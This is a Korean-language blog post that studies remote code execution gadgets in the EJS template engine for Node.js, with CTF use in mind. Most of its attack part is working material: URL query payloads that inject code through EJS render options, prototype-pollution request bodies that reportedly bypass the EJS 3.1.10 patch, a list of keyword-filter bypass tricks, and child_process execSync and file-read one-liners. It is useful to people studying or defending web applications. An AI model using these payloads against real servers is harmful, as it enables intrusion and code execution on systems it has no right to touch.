---
title: Exploring EJS RCE Gadgets
description: A study on EJS RCE gadgets
publishDate: 2024-10-18T09:20:38.272Z
tags:
  - Study
draft: false
---

최근 EJS와 관련된 문제를 많이 풀다 보니, EJS RCE에 관한 글 하나는 작성해보고 싶어서 작성한다.

## Introduction

시작하기 앞서, EJS에서 RCE가 왜 발생하는지 알아보자.

대부분의 경우는 **EJS maintainer**의 문제가 아닌, 사용자에게 모든 권한을 넘겨준 개발자의 문제로 취약점이 발생한다. 솔직히 말해서 이 부분은 취약점이라고도 하기 애매하다. 지금의 EJS는 아래와 같은 코드를 사용하지 말라고 하기 때문이다.

```javascript
app.get('/', (req, res) => {
	res.render('index', req.query)
})
```

물론 위 코드를 사용하지 않고도, **EJS RCE**를 발생시킬 수 있는 방법이 있다. 심지어, 아래와 같은 코드에서도 **EJS RCE**가 발생한다.

```javascript
app.get('/', (req, res) => {
	res.render('index')
})
```

위 코드에서는 왜 **RCE**가 발생할까?라는 생각이 들 수 있다. JS는 **prototype**에 크게 의존하는 언어이다. 즉, **prototype**이 오염된다면, 이를 통해 **RCE**를 발생시킬 수 있다. 최신 릴리즈된 버전인 **EJS@3.1.10**에서도 위 취약점이 발생한다.

참고로, 발생하는 이유에 대한 세부설명은 하지 않는다.

## EJS RCE

### EJS RCE with end-users unfettered access

해당 취약점은 아래의 코드에서 발생한다.

```javascript
app.get('/', (req, res) => {
	res.render('index', req.query)
})
```

위 코드에서 사용자가 입력한 **req.query**를 그대로 **render**에 넘겨주는 것을 볼 수 있다. 물론, **req.query**가 아니더라도 사용자가 입력한 값을 타입 검증 없이 넘겨주는 것은 위험하다.

그럼, 페이로드들에 대해서 알아보자.

#### EJS < 3.1.7

```plaintext
http://localhost:3000/?id=2&settings[view options][outputFunctionName]=x;console.log('rce!!');x
```

#### EJS (All versions)

```plaintext
http://localhost:3000/?id=2&settings[view options][client]=1&settings[view options][escapeFunction]=x;console.log('rce!!');x
```

### EJS RCE with prototype pollution

해당 취약점은 아래의 코드에서 발생한다. 물론, 인자로 아무것도 안 넘겨주는 경우도 발생한다.

```javascript
app.post('/a', (req, res) => {
	merge({}, req.body)
	res.render('index', { foo: 'bar' })
})
```

이 취약점은, **prototype pollution**을 통해 발생한다. 즉, **prototype pollution**이 **RCE**까지 연결될 수 있는 것이다. 또한, **prototype pollution**으로 발생하는 취약점은 **EJS@3.1.10**에서 한 번 패치가 됐지만, 간단한 우회 방법을 통해서 **EJS@3.1.10**에서도 발생한다.

#### EJS < 3.1.10

```typescript
await r.post('/a', {
	constructor: {
		prototype: {
			client: 1,
			escapeFunction: `console.log;console.info("RCE!!!")`
		}
	}
})
```

#### EJS <= 3.1.10 (작성일 기준)

```typescript
await r.post('/a', {
	constructor: {
		prototype: {
			'view options': {
				client: 1,
				escapeFunction: `console.log;console.info("RCE!!!")`
			}
		}
	}
})
```

#### Note

**Prototype Pollution**이 발생한다는 것 자체가 큰 취약점이다. **Prototype Pollution**이 발생한다면 사용하고 있는 라이브러리에 따라서, 큰 문제가 발생할 수 있다. _(Ex. **jsonwebtoken**을 사용 중이라면 **token**이 잘못 생성되게도 할 수 있다.)_

### EJS RCE In CTFs

CTF에서는 **EJS RCE**와 관련된 문제가 종종 출제된다. 그러나, 여러 필터링 방법, JS의 모듈(**CommonJS**, **ES Module**)에 따라서 공격 방법이 달라진다. 이때 사용할 수 있는 공격 방법을 알아보자.

#### Text filtering bypass

```plaintext
- this['proc' + 'cess']
- this[['proc', 'cess'].join('')]
- this['proc'.concat('cess')]
- this[`${'proc'}cess`]
- this[`${'proc' + 'cess'}`]
- this[`proc${''}cess`]
- String.fromCharCode(1)
- c='abcdefghijklmnopqrstuvwxyz';process[c[0]+c[1]]
- eval('proc' + 'ess')
- using [JSFuck](https://jsfuck.com/)
- using Unicode escape sequences (e.g., `\u0070\u0072\u006F\u0063\u0065\u0073\u0073` for `process`)
- replace, Function constructor, map, reduce, etc...
```

#### CommonJS

- process.mainModule.require('child_process').execSync('code to execute')

#### ES Module

- import('child_process').then(({ execSync }) => execSync('code to execute'))
- process.binding('fs').readFileUtf8('file to read',0,0)
